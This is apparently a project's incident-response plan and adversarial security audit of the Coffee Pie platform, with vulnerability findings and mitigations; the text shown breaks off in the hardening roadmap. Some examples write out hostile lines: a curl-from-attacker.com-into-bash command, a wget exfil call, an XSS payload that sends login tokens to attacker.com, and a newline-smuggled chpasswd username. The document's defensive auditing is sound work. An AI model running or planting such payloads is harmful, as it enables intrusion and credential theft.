# 🚨 EMERGENCY PROTOCOL — Coffee Pie® Technological Ecosystem
## Adversarial Security Analysis & Incident Response Plan (IRP)
**Status:** Active / Version 2.0.0 (May 2026)
**Classification:** Public — Operational Security Document
**License:** [BUSL-1.1](https://mariadb.com/bsl11/) (Core) / [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0) (Operations)

---

This document supersedes Version 1.0.0. It is the result of a full adversarial (black-hat) analysis of the Coffee Pie codebase, documentation, infrastructure model, and smart contract — followed by white-hat mitigations for every finding. Read it as: "Here is how an attacker thinks. Here is how we stop them."

---

## TABLE OF CONTENTS

1. [Resilience Philosophy](#1-resilience-philosophy)
2. [Incident Level Classification (Triage)](#2-incident-level-classification)
3. [Roles & Emergency Committee](#3-roles--emergency-committee)
4. [ATTACK SURFACE: Orchestrator (Django/Python)](#4-attack-surface-orchestrator)
5. [ATTACK SURFACE: Proxmox Backend (FastAPI)](#5-attack-surface-proxmox-backend)
6. [ATTACK SURFACE: Actor (Rust Daemon)](#6-attack-surface-actor)
7. [ATTACK SURFACE: Tunnel Server (Rust)](#7-attack-surface-tunnel-server)
8. [ATTACK SURFACE: COFP Token Smart Contract (Solidity/TRC-20)](#8-attack-surface-cofp-token)
9. [ATTACK SURFACE: Website (Vanilla JS/HTML/CSS)](#9-attack-surface-website)
10. [ATTACK SURFACE: Codec Terminal & Frontend (Qt/QML)](#10-attack-surface-frontend)
11. [ATTACK SURFACE: Infrastructure & Streaming](#11-attack-surface-infrastructure)
12. [ATTACK CHAINS: Multi-Stage Scenarios](#12-attack-chains)
13. [Step-by-Step Action Protocol (Level 3)](#13-step-by-step-action-protocol)
14. [Hardening Roadmap (Priority-Ordered)](#14-hardening-roadmap)
15. [Coordinated Vulnerability Disclosure (CVD)](#15-coordinated-vulnerability-disclosure)

---

## 1. Resilience Philosophy

At **Coffee Pie**, we recognize that technological failures, cyberattacks, and zero-day vulnerabilities are inevitable in any complex system. We cannot control the intentions of malicious actors, but we have 100% control over our response to them.

This emergency protocol is designed to **minimize socio-environmental impact, protect user data integrity, and mitigate CapEx/OpEx losses** through clean and quick isolation of the failure, without compromising the open, transparent spirit of the ecosystem.

> *"We cannot choose our external circumstances, but we can always choose how we respond to them."* — **Epictetus**

---

## 2. Incident Level Classification

### 🟢 LEVEL 1: Minor Degradation (Low Impact)
- **Definition:** Localized glitches that do not interrupt general service or expose data.
- **Examples:** Isolated hypervisor node crash (Live Migration recovers in <2s), single CPU/GPU failure, loss of secondary Leaf ToR switch.
- **Action:** Automatic mitigation by orchestrator. Logged for preventive maintenance.

### 🟡 LEVEL 2: Service Compromise (Moderate Impact)
- **Definition:** Software failures, auth degradation, network bottlenecks affecting user experience or monetization.
- **Examples:** Supabase/Authentik auth layer outage, storage VLAN saturation, Anti-Abuse Guardrail triggering on >15% of active slices due to malware injection (crypto-mining/spamming).
- **Action:** Immediate intervention by core infrastructure team. Segment isolation.

### 🔴 LEVEL 3: Critical Breach or Disaster (High Impact)
- **Definition:** Data sovereignty compromise, zero-day exploitation in QFDM core protocol, massive hardware failures.
- **Examples:** DDoS saturating 400 GbE uplinks, hypervisor breakout (cross-VM memory access), catastrophic DLC cooling loop failure, RCE via pickle deserialization chain, smart contract governance takeover.
- **Action:** Activate Emergency Committee. Isolate affected infrastructure. Execute disaster recovery plan.

**NEW — LEVEL 4 (CRITICAL+): Systemic Governance or Financial Breach**
- **Definition:** Attacks on the COFP token contract, multi-sig compromise, or financial infrastructure that threaten the ecosystem's economic foundation.
- **Examples:** Smart contract `onlyOwner` key compromise (mint/pause/ownership-transfer), BVC listing integrity breach, Gnosis Safe signer key theft.
- **Action:** Activate ALL signers on emergency channel. Contact TRON ecosystem security. Consider emergency contract pause if ownership is still controlled.

---

## 3. Roles & Emergency Committee

| Role | Core Member / Team | Primary Action During Crisis |
| :--- | :--- | :--- |
| **Incident Commander (IC)** | `avolink` / Core Team | Technical direction, strategic isolation/emergency shutdown decisions. |
| **Infrastructure Coordinator** | `juanvelezmunoz32-ai` / Admins | Proxmox API intervention, ZFS/NVMe pool balancing, Leaf switch management. |
| **Communications & Community** | `diegoalejandromendoza` / Moderators | Status page updates, GitHub Security Advisory, Discord/community transparency. |
| **Industrial / SENA Liaison** | `diegoalejandromendoza` / Experts | Physical hardware diagnostics, OSHW node troubleshooting, power/cooling. |
| **Smart Contract Guardian (NEW)** | To be appointed | COFP contract monitoring, Gnosis Safe transaction review, emergency pause coordination. |
| **External Security Auditor (NEW)** | To be contracted | Quarterly adversarial audits, penetration testing, CVD triage. |

---

## 4. ATTACK SURFACE: Orchestrator (Django/Python)

**Code location:** `coffeepie_orchestrator/server/src/uds/`

### VULN-ORCH-001: Pickle Deserialization → Remote Code Execution (RCE)
**Severity: CRITICAL | CVSS: 9.8 | Status: KNOWN DEBT**

**Attack Vector:** 30+ `pickle.loads()` calls across the codebase. If an attacker compromises the database (MySQL or SQLite), they can inject malicious pickled objects that execute arbitrary Python code on deserialization. The TicketStore encrypts pickles with AES-256-CBC (good), but authenticators do NOT:

- `RegexLdap/authenticator.py:177`: `self.storage.read_pickled(self.mfa_storage_key(username))`
- `SAML/saml.py:599`: `self.storage.read_pickled(self.mfa_storage_key(username))`
- `OAuth2/authenticator.py:249`: `self.storage.read_pickled(username)`
- `Radius/authenticator.py:155`: `self.storage.read_pickled(self.mfa_storage_key(username))`
- `SimpleLDAP/authenticator.py:232`: `self.storage.read_pickled(self.mfa_storage_key(username))`
- `core/mfas/mfa.py:275`: `self.storage.read_pickled(storage_key)`

**Attack Chain:**
1. Attacker gains write access to the DB (SQL injection in a CSRF-exempt endpoint, compromised credentials, or insider).
2. Attacker writes a malicious pickle payload to any `read_pickled` storage key.
3. Next time that authenticator reads the key, the pickle executes attacker code with Django process privileges.
4. Django process has access to SECRET_KEY, RSA_KEY, database credentials, and Proxmox API.

**Mitigation:**
1. **IMMEDIATE (Week 1):** Replace ALL `storage.read_pickled()` / `storage.save_pickled()` with JSON serialization + HMAC authentication. Pickle is fundamentally unsafe for untrusted data.
2. **SHORT-TERM (Week 2):** Add a database integrity layer — append an HMAC-SHA256 to every stored value, verify before deserialization. If HMAC fails, treat as tampering and alert.
3. **MEDIUM-TERM:** Migrate all serialization to a safe format (JSON with schema validation, or Protocol Buffers with a strict parser).

### VULN-ORCH-002: 6 CSRF-Exempt Endpoints
**Severity: HIGH | CVSS: 8.0 | Status: KNOWN DEBT**

**Attack Vector:** The entire REST API (`dispatcher.py:70`) is decorated with `@csrf_exempt`. Additional exempt endpoints in `mfa.py`, `service.py`, and `auth.py` (2 endpoints). This means any website can forge cross-origin requests to these endpoints if the user has an active session cookie.

```python
# dispatcher.py:70
@method_decorator(csrf_exempt)
def dispatch(self, request, path):
```

**Mitigation:**
1. **IMMEDIATE:** Add CSRF token validation to the REST dispatcher. Django's CSRF middleware is already in MIDDLEWARE — the `@csrf_exempt` is deliberately bypassing it.
2. **SHORT-TERM:** Require a custom header (`X-Requested-With: XMLHttpRequest` or `X-CSRFToken`) for all REST endpoints, which cannot be set cross-origin without CORS.
3. **MEDIUM-TERM:** Implement proper CORS policy with strict origin allowlist.

### VULN-ORCH-003: chpasswd Stdin Injection
**Severity: HIGH | CVSS: 7.8 | Status: KNOWN DEBT**

**Attack Vector:** `actor/crates/shared/src/unix/linux/mod.rs:101` and `mac/mod.rs:103`:

```rust
let input = format!("{}:{}\n", user, new_password);
```

If `user` contains a newline character (e.g., `"legit_user\nattacker:password"`), chpasswd will process TWO password changes: one for `legit_user` (fails) and one for `attacker` (succeeds). This allows privilege escalation to any local account on the VM.

**Mitigation:**
1. **IMMEDIATE:** Sanitize the `user` parameter — strip newlines, colons, and control characters before formatting.
2. **SHORT-TERM:** Use `chpasswd -e` (expects already-encrypted passwords) and hash the password before passing it through stdin.
3. **REFACTOR:** Use PAM or a library (nix crate's `unistd`) to change passwords directly instead of piping to chpasswd.

### VULN-ORCH-004: Django Production Settings Not Enforced
**Severity: HIGH | CVSS: 7.5 | Status: PARTIALLY DOCUMENTED**

**Attack Vector:** `settings.py.sample` contains:
- `DEBUG = True` — detailed error pages leak stack traces, environment variables, and file paths.
- `ALLOWED_HOSTS = ['*']` — accepts requests with any Host header, enabling DNS rebinding and cache poisoning.
- `SECRET_KEY` hardcoded — anyone with repo access can forge session cookies.
- `RSA_KEY` hardcoded — anyone with repo access can decrypt TicketStore data.
- `SESSION_COOKIE_HTTPONLY = False` — JavaScript can read session cookies (XSS → session theft).
- `SESSION_COOKIE_SECURE` is not set — cookies transmitted over HTTP.

**Mitigation:**
1. **IMMEDIATE:** Add a pre-flight check that REFUSES to start in production if `DEBUG=True`, `ALLOWED_HOSTS=['*']`, or `SECRET_KEY` matches the sample value. Crash loudly, don't run insecurely silently.
2. **SHORT-TERM:** All values in Section 6 of the 2026-05-25 audit must be set via environment variables with no hardcoded defaults.

### VULN-ORCH-005: Unpinned Git Dependency
**Severity: MEDIUM | CVSS: 6.5 | Status: KNOWN DEBT**

**Attack Vector:** `cannatag/ldap3.git` is an unpinned git dependency. If the upstream repo is compromised or the maintainer pushes malicious code, it will be pulled on next `pip install`.

**Mitigation:**
1. Pin to a specific commit hash: `git+https://github.com/cannatag/ldap3.git@<commit-hash>`
2. Mirror the dependency internally and audit before updating.

---

## 5. ATTACK SURFACE: Proxmox Backend (FastAPI)

**Code location:** `coffeepie_backend/proxmox_backend/app/`

### VULN-PROX-001: Authentication Bypass — Login Without Password
**Severity: CRITICAL | CVSS: 9.8 | Status: UNDOCUMENTED — NEW FINDING**

**Attack Vector:** `auth_routes.py:16-25`:

```python
@router.post("/auth/login")
def login(request: LoginRequest):
    try:
        user = auth_service.get_user_by_email(request.email)
        if user:
            custom_token = auth_service.create_custom_token(user.uid)
            return {"message": "Login successful", "custom_token": custom_token}
```

**The login endpoint NEVER validates the password.** It calls `get_user_by_email()` which is purely a Firebase lookup (returns user object if email exists), then immediately issues a custom token. ANYONE who knows a valid email address can obtain a Firebase custom token and authenticate to ALL proxmox management endpoints.

**This is the single most critical vulnerability in the entire codebase.** Combined with the full VM management API (clone, start, stop, delete, VNC, SPICE), an attacker with just a valid email can:
1. List all Proxmox nodes and VMs
2. Clone VMs (potentially accessing user data)
3. Delete arbitrary VMs
4. Obtain VNC/SPICE console access to any VM
5. Stop/start any VM

**Mitigation:**
1. **EMERGENCY (SAME DAY):** Add actual password verification. Use Firebase Auth's `sign_in_with_email_and_password` REST endpoint, NOT just `get_user_by_email`. The `LoginRequest` model already has a `password` field — it is simply never checked.
2. **EMERGENCY (SAME DAY):** Add rate limiting (e.g., 5 attempts per IP per minute) to `/auth/login`.
3. **SHORT-TERM:** Add MFA requirement for sensitive operations (VM delete, clone, VNC access).
4. **SHORT-TERM:** Add audit logging for ALL VM operations with user identity.

### VULN-PROX-002: Password Reset Link Leaked in Response
**Severity: HIGH | CVSS: 8.5 | Status: UNDOCUMENTED — NEW FINDING**

**Attack Vector:** `auth_routes.py:28-33`:

```python
@router.post("/auth/forgot-password")
def forgot_password(request: ForgotPasswordRequest):
    try:
        reset_link = auth_service.generate_password_reset_link(request.email)
        return {"message": "Password reset link sent successfully", "reset_link": reset_link}
```

The `reset_link` is returned in the API response body. It should be sent via email ONLY, never exposed to the API caller. Any caller can trigger a password reset for any email and receive the full reset link. This allows complete account takeover.

**Mitigation:**
1. **EMERGENCY (SAME DAY):** Remove `reset_link` from the response. Return only the message. Send the link via email using Firebase's built-in email action.
2. **SHORT-TERM:** Add rate limiting (1 reset per email per hour).

### VULN-PROX-003: Server-Side Request Forgery (SSRF) via Sunshine PIN
**Severity: HIGH | CVSS: 7.5 | Status: UNDOCUMENTED — NEW FINDING**

**Attack Vector:** `proxmox_routes.py:169-186`:

```python
@router.post("/sunshine/send-pin")
def sunshine_send_pin(request: SunshineRequest, ...):
    sunshine_url = f"https://{request.ip}:47990/api/pin"
    response = send_pin(sunshine_url, request.pin, request.client_name)
```

The endpoint takes a user-supplied `ip` field and makes an HTTPS request to it FROM the server. An attacker can:
1. Scan internal network (port 47990 on any internal IP)
2. Reach metadata services (AWS/GCP/Azure IMDS at 169.254.169.254)
3. Probe internal services behind the firewall

**Mitigation:**
1. **IMMEDIATE:** Validate that `request.ip` is a legitimate VM IP from the Proxmox cluster (check against known node IPs).
2. **SHORT-TERM:** Use an allowlist of known Sunshine host IPs.
3. **SHORT-TERM:** Block requests to private IP ranges (RFC 1918, link-local, loopback) unless explicitly approved.

### VULN-PROX-004: Hardcoded Proxmox Credentials in Environment
**Severity: MEDIUM (with env vars) / CRITICAL (if leaked) | Status: DESIGN CONCERN**

**Attack Vector:** `config.py` loads `PROXMOX_PASSWORD` from environment variables. If the `.env` file is accidentally committed or the orchestrator process is compromised, the attacker gains full Proxmox root API access — all VMs, all nodes, all storage.

**Mitigation:**
1. **SHORT-TERM:** Use Proxmox API tokens with least-privilege scoping instead of root user/password.
2. **SHORT-TERM:** Rotate credentials on a schedule (automated via Vault or similar).

---

## 6. ATTACK SURFACE: Actor (Rust Daemon)

**Code location:** `coffeepie_orchestrator/actor/`

### VULN-ACT-001: Arbitrary Command Execution from JavaScript Context
**Severity: HIGH | CVSS: 8.8 | Status: KNOWN DEBT**

**Attack Vector:** `client/crates/js/src/js_modules/process.rs` exposes `Process.launch()` and `Process.launchAndWait()` to the JavaScript engine (Boa). The JS context is served to the browser/client. If an attacker can inject JavaScript (XSS in the web client, compromised websocket messages), they can execute arbitrary binaries on the VM host with the Actor's privileges:

```javascript
// Attacker-injected JavaScript
Process.launch("/bin/bash", ["-c", "curl http://attacker.com/backdoor | bash"]);
Process.launchAndWait("wget", ["http://attacker.com/exfil", "-O", "/tmp/data"]);
```

**Mitigation:**
1. **IMMEDIATE:** Implement a command allowlist. Only pre-approved binaries can be launched from JS context.
2. **SHORT-TERM:** Sandbox the JS engine: seccomp, cgroups, no network access, read-only filesystem except specific paths.
3. **MEDIUM-TERM:** Replace Boa JS with a purpose-built DSL that cannot execute arbitrary commands.

### VULN-ACT-002: 70+ unwrap()/expect() Calls → DoS via Lock Poisoning
**Severity: MEDIUM | CVSS: 6.5 | Status: KNOWN DEBT**

**Attack Vector:** Network-facing Rust paths contain 70+ `unwrap()`/`expect()` calls (verified via grep). If a mutex is poisoned (panic while holding the lock in another thread), ANY subsequent `lock().unwrap()` will panic and crash that worker/connection. An attacker who can trigger a single panic in one thread can cascade-crash many connections.

Key locations include:
- `audio/src/lib.rs`: `buffer.write().unwrap()`, `latency.write().unwrap()` — multiple hot-path calls
- `tunnel/mod.rs`: `buffer[0..8].try_into().unwrap()` — network data parsing
- `handshake.rs`: `seq_buf[..8].try_into().unwrap()` — network data parsing
- `proxy_v2.rs`: `ProxyInfo::read_from_stream(...).await.unwrap()` — network data parsing

**Mitigation:**
1. **IMMEDIATE:** Audit all network-data-parsing unwrap/expect calls and replace with proper error handling (`?` operator, `Result` return).
2. **SHORT-TERM:** Replace `Mutex` with `parking_lot::Mutex` (no poisoning) or wrap in a `PoisonError` handler.
3. **MEDIUM-TERM:** Add fuzz testing for all network protocol parsers.

### VULN-ACT-003: NoVerifySsl — TLS Verification Disabled on Internal Paths
**Severity: MEDIUM | CVSS: 5.9 | Status: DOCUMENTED — PARTIALLY MITIGATED**

**Attack Vector:** `actor/crates/shared/src/tls/noverify.rs` provides a `NoVerifySsl` certificate verifier that accepts ANY server certificate. It's used in:
- `actor/crates/shared/src/ws/client/mod.rs:30` — WebSocket connections
- `client/crates/connection/src/v4/connection.rs:97` — Tunnel connections

The architectural decision restricts this to internal L2/L3 networks, but if an attacker gains a foothold on ANY internal host (via compromised VM, rogue device on stretched VLAN), they can MITM all internal TLS connections.

**Mitigation:**
1. **SHORT-TERM:** Replace `NoVerifySsl` with proper internal CA-signed certificates. Run an internal CA.
2. **SHORT-TERM:** Add certificate pinning for internal services.
3. **MEDIUM-TERM:** Use mTLS (mutual TLS) for all internal service-to-service communication.

---

## 7. ATTACK SURFACE: Tunnel Server (Rust)

**Code location:** `coffeepie_orchestrator/tunnel-server/`

### VULN-TUN-001: SessionRecoveryBuffer — Unsafe Send+Sync
**Severity: MEDIUM | CVSS: 5.5 | Status: KNOWN DEBT**

**Attack Vector:** `session/buffer.rs` implements a `RecoverySendBuffer` using `VecDeque<BufferedPacket>`. The known debt flag references `UnsafeCell` usage in the recovery buffer with unsafe `Send+Sync` implementations. While the current `buffer.rs` code appears to use safe Rust, the recovery module (`connection/recover.rs`) likely contains the unsafe code. Unsafe Send+Sync on a type containing UnsafeCell can cause data races if the buffer is shared across threads without proper synchronization.

**Mitigation:**
1. **SHORT-TERM:** Audit `connection/recover.rs` and `session/` for all UnsafeCell usage. Replace with safe synchronization primitives (`Arc<Mutex<T>>`, `crossbeam` channels).
2. **MEDIUM-TERM:** Run under `miri` (MIR interpreter for unsafe code detection) in CI.

### VULN-TUN-002: Conditional SSL Verification (Config-Driven)
**Severity: MEDIUM | CVSS: 5.9 | Status: DOCUMENTED**

**Attack Vector:** `broker/mod.rs:90`: `.danger_accept_invalid_certs(!verify_ssl)`. The `verify_ssl` config value controls whether TLS certificates are validated when communicating with the orchestrator's broker API. A misconfiguration or config file compromise disables SSL verification.

**Mitigation:**
1. Add an environment variable override that FORCES verification in production (`HERMES_FORCE_SSL_VERIFY=true`), ignoring config.
2. Log a WARNING at startup if verification is disabled on non-loopback addresses.

---

## 8. ATTACK SURFACE: COFP Token Smart Contract (Solidity/TRC-20)

**Code location:** `blockchain/COFP_Token.sol`

### VULN-COFP-001: Single-Point-of-Failure Ownership
**Severity: CRITICAL | CVSS: 9.0 | Status: DOCUMENTED — MITIGATION PLANNED**

**Attack Vector:** The contract uses a single-address `onlyOwner` model. The owner can:
- `pause()` / `unpause()` — freeze ALL token transfers instantly
- `mint(address, amount)` — mint unlimited tokens to any address (no supply cap)
- `transferOwnership(newOwner)` — give away complete control
- No timelock, no multi-sig, no governance delay

If the owner's private key is compromised (phishing, laptop theft, supply chain), the attacker can:
1. Pause all transfers (denial of service)
2. Mint unlimited new tokens to themselves (hyperinflation attack)
3. Transfer ownership to themselves (permanent takeover)
4. Sell on DEX before anyone notices

**Mitigation:**
1. **EMERGENCY (PRE-LAUNCH):** Transfer ownership to a Gnosis Safe multi-sig with minimum 4/7 signers (as documented in AGENTS.md). This MUST happen before BVC listing.
2. **PRE-LAUNCH:** Add a 48-hour timelock on `pause()`, `mint()`, and `transferOwnership()`. Use OpenZeppelin's `TimelockController`.
3. **PRE-LAUNCH:** Add an emergency `kill()` function accessible only by the multi-sig that permanently disables the contract (selfdestruct-equivalent for TRON).
4. **MEDIUM-TERM:** Deploy behind a transparent upgradeable proxy (OpenZeppelin `TransparentUpgradeableProxy`) to fix bugs without migrating tokens.

### VULN-COFP-002: No Blacklist/Freeze Mechanism
**Severity: HIGH | CVSS: 7.5 | Status: UNDOCUMENTED — NEW FINDING**

**Attack Vector:** No `_beforeTokenTransfer` hook or blacklist mechanism. If tokens are stolen (private key compromise, phishing), there is NO way to freeze the attacker's address or recover the tokens. The stolen tokens can be freely transferred and sold.

**Mitigation:**
1. **SHORT-TERM:** Add a governance-controlled blacklist. Requires multi-sig approval to add addresses.
2. **Add a recovery function:** Allow multi-sig to burn tokens from blacklisted addresses (with timelock).

### VULN-COFP-003: All Initial Tokens Minted to Deployer at Construction
**Severity: MEDIUM | CVSS: 5.0 | Status: DESIGN CONCERN**

**Attack Vector:** 100% of the INITIAL_SUPPLY (100M COFP) is minted to `msg.sender` in the constructor. The deployer holds the entire initial supply. If the deployer wallet is compromised before distribution, all initial tokens are stolen. However, this is only the bootstrap supply — additional tokens can be minted via `mint()` as Providers serve Slices, so a compromise does not permanently destroy the token economy.

**Mitigation:**
1. **PRE-LAUNCH:** Distribute tokens to the multi-sig and contributor/provider wallets immediately after deployment.
2. **PRE-LAUNCH:** Consider a vesting contract with time-locked releases for team/advisors.

---

## 9. ATTACK SURFACE: Website (Vanilla JS/HTML/CSS)

**Code location:** `coffeepie_website/public/`

### VULN-WEB-001: DOM-based XSS via innerHTML + Translations
**Severity: HIGH | CVSS: 7.2 | Status: UNDOCUMENTED — NEW FINDING**

**Attack Vector:** `translate.js:242`:
```javascript
div.innerHTML = menuHtml;
```

The `menuHtml` string is constructed from locale strings and injected with `innerHTML`. If `translations.json` is compromised (supply chain attack, compromised build pipeline, insider threat), an attacker can inject arbitrary HTML/JavaScript that executes in every visitor's browser. Since the CSP allows `'unsafe-inline'`, the injected script will run.

Additionally, `translate.js` builds dropdown options from `LANGUAGES` array and injects them, but these are hardcoded. However, `buildDropdownToggleHTML()` passes `data.locale` directly into HTML — if `LANGUAGES` were ever loaded from an external source, it would be injectable.

**Mitigation:**
1. **IMMEDIATE:** Replace `innerHTML` with DOM API calls (`document.createElement`, `textContent`). Never inject HTML from data.
2. **IMMEDIATE:** Add Subresource Integrity (SRI) hashes to all external scripts.
3. **SHORT-TERM:** Remove `'unsafe-inline'` from CSP `script-src`. Use nonces or hashes for legitimate inline scripts.
4. **SHORT-TERM:** Add integrity checking to `translations.json` — ship it with a `.sig` file verified at load time.

### VULN-WEB-002: postMessage Without Origin Validation
**Severity: MEDIUM | CVSS: 6.1 | Status: UNDOCUMENTED — NEW FINDING**

**Attack Vector:** `translate.js:61`:
```javascript
document.querySelectorAll('iframe').forEach(function(iframe) {
    try { iframe.contentWindow.postMessage({ type: 'cp-lang-change', lang: lang }, '*'); } catch(e) {}
});
```

The wildcard target origin `'*'` means the message is sent to ANY embedded iframe regardless of its origin. A malicious iframe (injected via XSS or ad network compromise) can:
1. Receive the `cp-lang-change` message
2. Potentially use this information to fingerprint users

More critically, if the page listens for incoming `postMessage` without origin validation, an attacker page can send malicious messages.

**Mitigation:**
1. **IMMEDIATE:** Replace `'*'` with the specific expected origin(s).
2. **SHORT-TERM:** Add `event.origin` validation to any `message` event listeners.

### VULN-WEB-003: Giant Third-Party Surface (Avo/Wix Platform)
**Severity: MEDIUM | CVSS: 5.0 | Status: ARCHITECTURAL CONCERN**

**Attack Vector:** `index.html` is 2.5MB with massive inline bundles from Avo/Wix (thunderbolt, avoui, parastorage.com, avostatic.com). The CSP allows scripts from `static.parastorage.com` and `static.avostatic.com`. If ANY of these third-party CDNs is compromised, the attacker gets full JavaScript execution on coffeepie.co.

**Mitigation:**
1. **SHORT-TERM:** Add SRI hashes for all third-party scripts.
2. **MEDIUM-TERM:** Phase out Wix/Avo dependency as planned. The AGENTS.md already states preference for vanilla technologies.
3. **MONITORING:** Set up CSP report-only mode (`report-uri`) to detect violations without breaking the site.

---

## 10. ATTACK SURFACE: Codec Terminal & Frontend (Qt/QML)

**Code location:** `coffeepie_frontend/`

### VULN-FE-001: Kiosk Escape via Ctrl+Alt+T
**Severity: HIGH | CVSS: 7.0 | Status: BY DESIGN — NEEDS HARDENING**

**Attack Vector:** The architecture document states: "advanced users and IT Admins can open a CLI with a keyboard shortcut (e.g., Ctrl + Alt + T)". On a kiosk-mode Debian Sway terminal in a public space, this means ANYONE with physical access can:
1. Press Ctrl+Alt+T
2. Get a bash shell
3. Access the filesystem, network, USB-IP peripherals
4. Potentially escalate to other systems on the L2 network

**Mitigation:**
1. **IMMEDIATE:** The CLI shortcut must require authentication (sudo password, OTP, or admin PIN) before opening.
2. **SHORT-TERM:** Lock down the CLI environment — restrict to a specific set of whitelisted commands, no shell escapes.
3. **SHORT-TERM:** The CLI should only be accessible via the orchestrator API, not locally on the codec terminal.

### VULN-FE-002: Plaintext Password in QML
**Severity: MEDIUM | CVSS: 5.5 | Status: UNDOCUMENTED**

**Attack Vector:** `Login_Screen.qml:61`:
```qml
api.login(inputFieldUser.text, inputFieldPassword.text)
```

The password is passed as a plain string through QML to C++/Python. In Qt's signal/slot mechanism, this string may be logged or stored in debug output. The communication to the backend must be over HTTPS, but the password is in memory as plaintext.

**Mitigation:**
1. Ensure the login API call uses HTTPS exclusively.
2. Clear the password field from memory immediately after use.
3. Add a memory-zeroing wrapper for sensitive strings.

---

## 11. ATTACK SURFACE: Infrastructure & Streaming

### VULN-INFRA-001: L2 Stretched VLAN — ARP Spoofing
**Severity: HIGH | CVSS: 7.5 | Status: ARCHITECTURAL**

**Attack Vector:** All hosts are on a stretched L2 VLAN, directly reachable at private IPs. Any compromised host can:
1. ARP spoof to intercept traffic between orchestrator and VMs
2. MITM Sunshine/Moonlight UDP streams
3. Perform network reconnaissance on ALL internal hosts

**Mitigation:**
1. **SHORT-TERM:** Enable port security on all switch ports (limit MAC addresses per port).
2. **SHORT-TERM:** Deploy dynamic ARP inspection (DAI) on managed switches.
3. **MEDIUM-TERM:** Segment the network into VLANs — orchestrator, VM hosts, storage, and management each on separate VLANs with routed access control.

### VULN-INFRA-002: Sunshine/Moonlight — Unencrypted Streaming Path
**Severity: MEDIUM | CVSS: 5.9 | Status: ARCHITECTURAL**

**Attack Vector:** The AGENTS.md states "Encryption is optional (network-layer security handles it)". Sunshine/Moonlight streams over UDP without application-layer encryption. Anyone on the L2 network can intercept video, audio, and potentially inject keystrokes.

**Mitigation:**
1. **SHORT-TERM:** Enable Sunshine's built-in encryption if available.
2. **MEDIUM-TERM:** Implement WireGuard tunnels between Codec Terminals and VM hosts for all streaming traffic.
3. **MEDIUM-TERM:** Evaluate DTLS for UDP stream encryption.

### VULN-INFRA-003: Edge Router — Single Point of Failure
**Severity: MEDIUM | CVSS: 5.0 | Status: ARCHITECTURAL**

**Attack Vector:** The emergency protocol mentions Edge Router (MikroTik/Cisco) as a single device handling BGP Blackholing. If this router is DDoS'd or compromised, the entire cluster loses external connectivity.

**Mitigation:**
1. **MEDIUM-TERM:** Deploy redundant edge routers with VRRP/HSRP.
2. **MEDIUM-TERM:** Use a DDoS mitigation service (Cloudflare Magic Transit, Akamai) for internet-facing endpoints.

---

## 12. ATTACK CHAINS: Multi-Stage Scenarios

### ATTACK CHAIN A: From Website XSS to Full Infrastructure Compromise

**Steps:**
1. Attacker compromises `translations.json` (supply chain, insider, or build pipeline)
2. Injects JS payload: `<img src=x onerror="fetch('/auth/login',{method:'POST',body:JSON.stringify({email:'admin@coffeepie.co'})}).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+d.custom_token))">`
3. Every visitor to coffeepie.co unknowingly fetches auth tokens for known emails
4. Attacker uses the custom token to authenticate to the Proxmox backend (VULN-PROX-001)
5. Attacker lists all VMs, stops critical ones, clones user VMs, extracts data via VNC
6. Attacker deploys cryptominers on all available VMs

**Total Compromise Time: < 30 minutes**
**Required Vulnerabilities: VULN-WEB-001 + VULN-PROX-001**

### ATTACK CHAIN B: From Rogue ISP Customer to Network Dominance

**Steps:**
1. Attacker rents/purchases a Codec Terminal from the ISP
2. Presses Ctrl+Alt+T for CLI access (VULN-FE-001)
3. Runs ARP spoofing on the L2 stretched VLAN (VULN-INFRA-001)
4. Intercepts orchestrator-to-VM communications
5. If TLS verification is disabled (VULN-ACT-003), reads all traffic in plaintext
6. Injects malicious pickle payload into any intercepted storage write
7. Gains RCE on the orchestrator (VULN-ORCH-001)
8. Full infrastructure control

### ATTACK CHAIN C: Smart Contract Takeover → Economic Collapse

**Steps:**
1. Attacker phishes the COFP contract owner's private key
2. Calls `pause()` — all token transfers frozen (VULN-COFP-001)
3. Calls `mint(attacker_address, 100_000_000 * 10**18)` — mints 100M new tokens (or unlimited)
4. Calls `transferOwnership(attacker_address)` — permanent takeover
5. Unpauses, dumps tokens on DEX before anyone can react
6. COFP token value collapses → BVC listing credibility destroyed

---

## 13. Step-by-Step Action Protocol (Level 3/4)

### 🛰️ Step 1: Identification & Immediate Isolation (Minutes 0-15)

1. **Detection:** Early warning systems trigger alarms due to bandwidth anomalies or critical thermal spikes.
2. **Isolation:** Orchestrator immediately blocks new session allocations within the affected cluster.
3. **Edge Mitigation:** For external network attacks, reconfigure Edge Router via BGP Blackholing or SD-WAN path cleaning. Reroute legitimate traffic to secondary clusters via Geo-DNS.
4. **Smart Contract (Level 4):** If ownership is still controlled by the team, immediately call `pause()` via Gnosis Safe to freeze all transfers while assessing the situation.

### 🔧 Step 2: Tiered Storage Mitigation & Diagnostics (Minutes 15-45)

1. **Core Integrity Check:** Verify base OS templates (Linked Clones) on NVMe pool haven't been tampered with.
2. **Data Preservation:** Freeze HDD backup pools in Read-Only mode to prevent ransomware encryption loops.
3. **Hardware Failover:** Force-shutdown failed hardware via IPMI/DASH. Restore critical instances onto clean nodes using replicated storage state.
4. **Auth System Check:** If VULN-PROX-001 is suspected, immediately:
   - Rotate all Firebase custom tokens (invalidate existing ones)
   - Audit the `/auth/login` endpoint logs for unusual email patterns
   - Check Proxmox audit logs for unauthorized VM operations
   - Force password reset for all admin accounts

### 📢 Step 3: Radical Transparency & Disclosure (Minutes 45-90)

1. Update `https://www.coffeepie.co/status` with accurate, raw metrics of the incident.
2. **GitHub Security Advisory:** Open a private advisory for software exploits. Develop patches collaboratively with approved contributors.
3. No data or architectural shortcomings will be hidden from investors or community users.

### 🧪 Step 4: Eradication & Post-Mortem (Next 24 Hours)

1. **Patch Deployment:** Compile and push verified security patches in Rust/C++.
2. **Silicon Audit:** Inspect physical state of AMD V710 GPUs and EPYC processing units.
3. **Lessons Learned:** Publish `POST_MORTEM.md` with attack vector, response timeframes, and structural adjustments.
4. **Token Contract:** If ownership was transferred to multi-sig, verify all signers maintain access. If attack occurred, coordinate with TRON ecosystem and exchanges.

---

## 14. Hardening Roadmap (Priority-Ordered)

### EMERGENCY (This Week — Before Any Production Traffic)

| # | Action | Mitigates |
|---|--------|-----------|
| 1 | Fix `/auth/login` to verify passwords (VULN-PROX-001) | Critical auth bypass |
| 2 | Remove `reset_link` from `/auth/forgot-password` response (VULN-PROX-002) | Account takeover |
